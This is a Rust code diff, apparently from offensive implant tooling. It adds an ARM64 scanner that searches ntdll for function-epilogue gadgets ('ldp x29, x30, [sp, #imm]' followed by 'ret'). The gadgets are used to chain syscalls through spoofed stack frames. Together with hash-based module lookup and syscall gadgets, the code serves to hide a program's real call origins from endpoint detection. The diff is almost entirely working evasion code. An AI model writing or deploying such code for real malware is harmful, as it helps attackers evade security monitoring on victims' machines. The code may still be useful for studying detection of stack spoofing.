@@ -525,6 +525,176 @@ pub fn build_legacy_chain() -> Option<ResolvedChain> {
     }
 }
 
+// ── ARM64 epilogue gadget scanner ───────────────────────────────────────────
+//
+// On ARM64, `ret` is just `br x30` — it does NOT pop a return address from
+// the stack like x86-64's `ret`.  To chain through spoofed stack frames, we
+// need function epilogue gadgets that load x30 from a controlled stack slot
+// before returning.  The canonical pattern is:
+//
+//     ldp x29, x30, [sp, #M]     ; load x29 from [sp+M], x30 from [sp+M+8]
+//     add  sp, sp, #N            ; (optional) unwind the stack frame
+//     ret                        ; branch to x30 (our continuation)
+//
+// By choosing M >= nstack*8, we can place the continuation after the stack-
+// passed syscall arguments, so the kernel reads the real args from [sp+0..]
+// while the epilogue reads the continuation from [sp+M+8].
+
+/// An ARM64 function epilogue gadget suitable for stack-spoof chain frames.
+///
+/// The gadget starts at a `ldp x29, x30, [sp, #offset]` (signed-offset
+/// addressing) instruction inside a system DLL.  After the syscall gadget's
+/// `svc #0; ret`, execution reaches this gadget which loads x30 from
+/// `[sp + offset + 8]` (our continuation address) and then `ret`s to it.
+#[derive(Clone, Copy, Debug)]
+pub struct Arm64EpilogueGadget {
+    /// Address of the `ldp` instruction (entry point of the gadget).
+    pub gadget_addr: usize,
+    /// Byte offset from sp where the `ldp` loads x29 (at `sp + offset`)
+    /// and x30 / continuation (at `sp + offset + 8`).
+    pub stack_offset: u32,
+}
+
+/// Cache of ARM64 epilogue gadgets found in ntdll, keyed by stack_offset.
+static ARM64_EPILOGUE_CACHE: OnceLock<HashMap<u32, Arm64EpilogueGadget>> = OnceLock::new();
+
+/// Scan ntdll's code section for ARM64 function epilogue gadgets.
+///
+/// Searches for `ldp x29, x30, [sp, #imm]` (signed-offset variant) followed
+/// by `ret` within 6 instructions.  Each valid gadget is stored keyed by its
+/// stack offset.  Only gadgets with valid unwind metadata are retained.
+unsafe fn scan_arm64_epilogues() -> HashMap<u32, Arm64EpilogueGadget> {
+    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};
+
+    let mut gadgets: HashMap<u32, Arm64EpilogueGadget> = HashMap::new();
+
+    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
+        Some(b) => b,
+        None => return gadgets,
+    };
+
+    // Walk PE headers to find the code section range.
+    let dos = &*(ntdll as *const IMAGE_DOS_HEADER);
+    if dos.e_magic != 0x5A4D {
+        return gadgets;
+    }
+    let nt_hdr = &*((ntdll + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
+    let code_start = ntdll + nt_hdr.OptionalHeader.BaseOfCode as usize;
+    let code_size = nt_hdr.OptionalHeader.SizeOfCode as usize;
+
+    if code_size < 28 {
+        return gadgets;
+    }
+
+    let n_words = code_size / 4;
+    let words = std::slice::from_raw_parts(code_start as *const u32, n_words);
+
+    // ARM64 `ret` instruction.
+    const ARM64_RET: u32 = 0xD65F_03C0;
+
+    // `ldp x29, x30, [sp, #imm]` (signed-offset, 64-bit):
+    //   opc=10 | 101 | V=0 | 01 | 0 | imm7 | Rt2=30 | Rn=31 | Rt=29
+    // Fixed bits (with imm7 masked out):
+    const LDP_SIGNED_MASK: u32 = 0xFF80FFFF;
+    const LDP_SIGNED_BASE: u32 = 0xA900F7FD;
+
+    // `add sp, sp, #imm` (64-bit, no shift):
+    //   sf=1 | 00 | 10001 | 00 | imm12 | Rn=31 | Rd=31
+    const ADD_SP_MASK: u32 = 0xFFC003FF;
+    const ADD_SP_BASE: u32 = 0x910003FF;
+
+    for i in 0..n_words.saturating_sub(6) {
+        let word = words[i];
+
+        // Check for `ldp x29, x30, [sp, #imm]` (signed offset).
+        if (word & LDP_SIGNED_MASK) != LDP_SIGNED_BASE {
+            continue;
+        }
+
+        // Extract imm7 (signed 7-bit, scaled by 8).
+        let imm7 = ((word >> 16) & 0x7F) as u32;
+        if imm7 & 0x40 != 0 {
+            continue; // Negative offset — not useful.
+        }
+        let offset = imm7 * 8;
+        if offset > 256 {
+            continue; // Unreasonably large for our use case.
+        }
+
+        let gadget_addr = code_start + i * 4;
+        if !has_valid_unwind_info(gadget_addr) {
+            continue;
+        }
+
+        // Scan forward (up to 6 instructions) looking for an epilogue
+        // sequence: optional `add sp, sp, #N` then `ret`.
+        let mut frame_size: u32 = 0;
+        let mut found_ret = false;
+        for j in 1..=6 {
+            if i + j >= n_words {
+                break;
+            }
+            let next = words[i + j];
+            if (next & ADD_SP_MASK) == ADD_SP_BASE && frame_size == 0 {
+                frame_size = (next >> 10) & 0xFFF;
+            } else if next == ARM64_RET {
+                found_ret = true;
+                break;
+            }
+        }
+
+        if !found_ret {
+            continue;
+        }
+
+        // The frame_size from `add sp` is informational; we restore sp
+        // via CONTEXT.X20 at the continuation, so any value works.
+        let _ = frame_size;
+
+        // Keep the first (lowest-address) gadget for each offset.
+        gadgets.entry(offset).or_insert(Arm64EpilogueGadget {
+            gadget_addr,
+            stack_offset: offset,
+        });
+    }
+
+    if !gadgets.is_empty() {
+        let mut keys: Vec<u32> = gadgets.keys().copied().collect();
+        keys.sort_unstable();
+        tracing::info!(
+            "stack_db: found {} ARM64 epilogue gadgets (offsets: {:?})",
+            gadgets.len(),
+            keys
+        );
+    } else {
+        tracing::warn!("stack_db: no ARM64 epilogue gadgets found in ntdll");
+    }
+
+    gadgets
+}
+
+/// Get an ARM64 epilogue gadget suitable for syscalls with the given number
+/// of stack-passed arguments.
+///
+/// Returns a gadget whose `stack_offset >= nstack * 8`, meaning the `ldp
+/// x29, x30` reads from a position after the stack args.  The caller places
+/// the continuation address at `buf[stack_offset / 8 + 1]` in the frame
+/// buffer.
+///
+/// Returns `None` if no suitable gadget was found (caller should fall back
+/// to the simple `blr` dispatch).
+pub fn get_arm64_epilogue_for_nstack(nstack: usize) -> Option<Arm64EpilogueGadget> {
+    ensure_initialised();
+    let cache = ARM64_EPILOGUE_CACHE.get_or_init(|| unsafe { scan_arm64_epilogues() });
+
+    let min_offset = (nstack * 8) as u32;
+    cache
+        .values()
+        .filter(|g| g.stack_offset >= min_offset)
+        .min_by_key(|g| g.stack_offset)
+        .copied()
+}
+
 // ── Stack frame layout helpers ──────────────────────────────────────────────
 
 /// Calculate the number of u64 slots needed for the spoofed chain frame buffer.
@@ -714,7 +884,7 @@ fn is_executable_address(addr: usize) -> bool {
             std::mem::size_of::<MEMORY_BASIC_INFORMATION>() as u64, // Length
             &mut return_len as *mut _ as u64,                       // ReturnLength
         );
-        if status.is_err() || status.unwrap() < 0 {
+        if !matches!(status, Ok(s) if s >= 0) {
             return false;
         }
         if mbi.State != MEM_COMMIT {
